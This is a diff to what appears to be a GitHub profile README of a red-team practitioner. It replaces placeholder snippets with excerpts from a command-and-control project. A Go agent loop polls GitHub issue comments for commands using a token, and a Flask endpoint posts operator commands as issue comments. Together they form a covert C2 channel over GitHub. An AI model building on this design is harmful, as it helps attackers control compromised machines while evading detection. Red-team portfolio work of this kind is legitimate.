@@ -22,18 +22,43 @@ I'm currently focused on specializing in **cybersecurity operations, red teaming
 
 ### My Projects
 
-```rust
-// Rust-based security tool (example snippet)
-pub fn exploit() {
-    println!("Launching payload...");
-    // Payload execution logic
-}
+```go
+//actual snippet from the agent.go
+func executeCommands() {
+	for {
+		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
+		req, _ := http.NewRequest("GET", url, nil)
+		req.Header.Set("Authorization", "token "+githubToken)
+		req.Header.Set("Accept", "application/vnd.github.v3+json")
+
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err != nil {
+			log.Println("❌ Failed to fetch commands:", err)
+			continue
+		}
+		defer resp.Body.Close()
 ```
 
 ```python
-# Python-based C2 communication
-def send_command(command):
-    return f"Executing: {command}"
+//Also an actual code snippet from app.py
+def submit():
+    data = request.get_json()
+    agent_id = data.get("agent")
+    command = data.get("message")
+
+    if not agent_id or not command:
+        return jsonify({"error": "Invalid request"}), 400
+
+    response = requests.post(
+        f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}/comments",
+        json={"body": f"Command: {command}"},
+        headers=HEADERS
+    )
+
+    if response.status_code == 201:
+        return jsonify({"success": "Command submitted"}), 200
+    return jsonify({"error": "Failed to send command"}), 500
 ```
 
 ## Tools & Technologies
